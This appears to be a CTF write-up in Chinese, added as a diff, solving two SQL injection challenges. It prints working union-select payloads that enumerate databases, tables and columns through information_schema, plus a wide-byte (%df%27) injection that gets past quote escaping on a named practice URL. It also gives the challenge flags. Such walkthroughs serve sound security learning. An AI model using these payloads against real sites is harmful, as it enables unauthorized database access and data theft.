@@ -1,0 +1,44 @@
+1,进行简单的测试,再万能钥匙上一遍
+
+2,猜测列数为4,因为4个数据一直在变,利用order by检测列数
+
+3,和列有关的,自然想到联合注入,上union select
+
+4,查看当前数据库database(),version()
+-1' union select 1,2,3,database()#
+
+5,查看当前数据库中的所有表
+-1' union select 1,2,3,concat(table_name) from information_schema.tables where table_schema='skctf_flag'#
+fl4g
+
+6,查看当前表所有列
+-1' union select 1,2,3,concat(column_name) from information_schema.columns where table_name='fl4g'#
+skctf_flag
+
+7,获得flag
+BUGKU{Sql_INJECT0N_4813drd8hz4}
+
+宽字节：https://blog.csdn.net/qq_40476955/article/details/79019154
+http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1
+
+1.使用万能钥匙试一试,发现'被转义
+
+2.为了让单引号有意义,想到宽字节注入
+
+3.order by验证列数
+
+4.使第一个查询失去失效,用union select进行爆当前库
+
+5.发现使用# 被过滤,使用其url编码%23
+
+6.爆当前库里所有表
+1%df%27 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=sae-chinalover%23
+因为后面where字符也需要打单引号,可以用database()代替此名字
+1%df%27 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23
+
+7.爆各表中的列找到flag 在ctf4中,单引号会被转义掉,这种情况下,我们用十六进制来表示表名
+1%df%27 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634%23
+
+8.找到flag
+1%df%27 and 1=2 union select 1,flag from ctf4%23
+第二种方法是用sqlmap直接爆
